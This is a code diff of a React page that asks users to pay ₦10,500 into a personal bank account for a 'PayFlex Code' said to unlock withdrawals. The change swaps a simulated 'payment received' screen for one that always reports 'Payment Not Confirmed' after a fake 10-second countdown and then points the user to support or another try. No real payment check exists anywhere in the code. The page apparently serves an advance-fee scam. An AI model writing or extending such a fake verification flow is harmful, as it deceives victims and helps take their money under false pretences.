@@ -14,20 +14,21 @@ import {
   Home,
   Loader2,
   Check,
+  Clock,
+  Headphones,
 } from 'lucide-react'
 
 export default function BuyPayFlexCodePage() {
   const router = useRouter()
   const [showWarningModal, setShowWarningModal] = useState(true)
   const [copiedAccount, setCopiedAccount] = useState(false)
-  const [copiedCode, setCopiedCode] = useState(false)
   const [receiptImage, setReceiptImage] = useState<File | null>(null)
   const [previewUrl, setPreviewUrl] = useState<string | null>(null)
   
   // Verification states
   const [isVerifying, setIsVerifying] = useState(false)
   const [countdown, setCountdown] = useState(10)
-  const [showSuccessModal, setShowSuccessModal] = useState(false)
+  const [showFailedNotice, setShowFailedNotice] = useState(false)
 
   // Static Manual Bank Details
   const MANUAL_BANK = {
@@ -36,9 +37,6 @@ export default function BuyPayFlexCodePage() {
     accountName: 'Olamilakan Oso',
     PayFlexCodeRate: '₦10,500 for the PayFlex Code',
   }
-
-  // Updated code constant to match withdraw page
-  const CORRECT_PayFlexCode_CODE = 'Payflex0102'
 
   // Handle 10-second timer
   useEffect(() => {
@@ -49,19 +47,16 @@ export default function BuyPayFlexCodePage() {
       }, 1000)
     } else if (isVerifying && countdown === 0) {
       setIsVerifying(false)
-      setShowSuccessModal(true)
+      setShowFailedNotice(true)
     }
     return () => clearTimeout(timer)
   }, [isVerifying, countdown])
 
-  const handleCopy = (text: string, type: 'account' | 'code') => {
+  const handleCopy = (text: string, type: 'account') => {
     navigator.clipboard.writeText(text)
     if (type === 'account') {
       setCopiedAccount(true)
       setTimeout(() => setCopiedAccount(false), 2000)
-    } else {
-      setCopiedCode(true)
-      setTimeout(() => setCopiedCode(false), 2000)
     }
   }
 
@@ -95,12 +90,13 @@ export default function BuyPayFlexCodePage() {
     // Start 10-second verification simulation
     setCountdown(10)
     setIsVerifying(true)
+    setShowFailedNotice(false)
   }
 
   return (
     <div className="min-h-screen bg-[#121212] text-white pb-16 relative">
       {/* 1. Opay Warning Modal */}
-      {showWarningModal && !isVerifying && !showSuccessModal && (
+      {showWarningModal && !isVerifying && !showFailedNotice && (
         <div className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm flex items-center justify-center p-3">
           <div className="bg-[#181818] border border-[#2a2a2a] rounded-2xl p-4 max-w-xs w-full shadow-2xl text-center space-y-3">
             <div className="w-12 h-12 bg-amber-500/20 rounded-xl flex items-center justify-center mx-auto">
@@ -152,47 +148,38 @@ export default function BuyPayFlexCodePage() {
         </div>
       )}
 
-      {/* 3. Payment Received Successfully & Code Reveal Modal */}
-      {showSuccessModal && (
+      {/* 3. Payment Not Confirmed Modal after 10 seconds */}
+      {showFailedNotice && (
         <div className="fixed inset-0 z-[120] bg-black/60 backdrop-blur-sm flex items-center justify-center p-3">
-          <div className="bg-[#181818] border border-[#2a2a2a] rounded-2xl p-4 max-w-sm w-full shadow-2xl text-center space-y-3">
-            <div className="w-12 h-12 bg-emerald-500/20 rounded-xl flex items-center justify-center mx-auto">
-              <CheckCircle2 className="w-7 h-7 text-[#00B67A]" />
+          <div className="bg-[#181818] border border-[#2a2a2a] rounded-2xl p-4 max-w-xs w-full shadow-2xl text-center space-y-4">
+            <div className="w-12 h-12 bg-red-500/20 rounded-xl flex items-center justify-center mx-auto">
+              <AlertTriangle className="w-7 h-7 text-red-400" />
             </div>
 
-            <h2 className="text-lg font-bold text-white">Payment Received Successfully!</h2>
+            <h2 className="text-lg font-bold text-red-500">Payment Not Confirmed</h2>
 
-            <p className="text-xs text-white/60 font-medium leading-relaxed">
-              Here is your PayFlex Code. Copy it and paste it into your withdrawal page to proceed:
+            <p className="text-xs text-white/70 font-medium leading-relaxed">
+              We couldn't automatically verify your payment session at this time. Please contact support with your payment receipt.
             </p>
-
-            <div className="bg-[#121212] p-3 rounded-xl border border-[#2a2a2a] flex items-center justify-between gap-2">
-              <span className="font-mono font-bold text-xs text-[#00B67A] select-all break-all text-left">
-                {CORRECT_PayFlexCode_CODE}
-              </span>
-              <button
-                onClick={() => handleCopy(CORRECT_PayFlexCode_CODE, 'code')}
-                className="bg-[#00B67A] text-black p-2 rounded-lg hover:bg-[#00a36d] transition flex-shrink-0"
-                title="Copy Code"
-              >
-                {copiedCode ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-              </button>
-            </div>
 
             <div className="space-y-2 pt-1">
               <button
-                onClick={() => router.push('/withdraw')}
-                className="w-full bg-[#00B67A] text-black font-semibold text-xs py-2.5 px-3 rounded-lg hover:bg-[#00a36d] transition flex items-center justify-center gap-2 shadow-sm"
+                onClick={() => router.push('/support')}
+                className="w-full bg-red-600 hover:bg-red-700 text-white text-xs font-bold py-2.5 px-3 rounded-xl flex items-center justify-center gap-2 transition shadow-sm"
               >
-                Proceed to Withdrawal
+                <Headphones className="w-4 h-4" />
+                Contact Support
               </button>
-
+              
               <button
-                onClick={() => router.push('/dashboard')}
-                className="w-full bg-[#252525] text-white font-semibold text-xs py-2.5 px-3 rounded-lg hover:bg-[#303030] transition flex items-center justify-center gap-2"
+                onClick={() => {
+                  setShowFailedNotice(false)
+                  setCountdown(10)
+                  setIsVerifying(true)
+                }}
+                className="w-full bg-[#252525] hover:bg-[#303030] text-white text-xs font-bold py-2.5 px-3 rounded-xl transition"
               >
-                <Home className="w-4 h-4 text-white/60" />
-                Go to Homepage
+                Try Again
               </button>
             </div>
           </div>
